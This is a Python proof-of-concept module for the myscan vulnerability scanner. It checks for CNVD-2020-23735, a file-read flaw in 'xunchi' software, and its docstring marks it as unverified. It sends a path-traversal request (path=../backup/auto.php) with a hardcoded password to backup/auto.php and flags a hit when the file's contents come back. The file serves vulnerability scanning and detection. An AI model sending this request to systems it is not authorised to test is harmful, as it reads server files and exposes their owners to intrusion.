# !/usr/bin/env python3
# @Time    : 2020/11/2
# @Author  : caicai
# @File    : poc_xunchi-cnvd-2020-23735-file-read_2020.py


'''
未验证
'''

from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "xunchi-cnvd-2020-23735-file-read"
        self.vulmsg = "link : https://www.cnvd.org.cn/flaw/show/2025171"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return

        req = {
            "url": self.url + "backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php",
            "method": "GET",
            "headers": {
                "Accept-Encoding": "deflate"},
            "verify": False,
            "timeout": 10,
        }
        r = request(**req)
        if r is not None and r.status_code == 200 and b"NzbwpQSdbY06Dngnoteo2wdgiekm7j4N" in r.content and b"display_errors" in r.content:
            parse = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parse.getrequestraw(),
                    "response": parse.getresponseraw(),
                }
            })
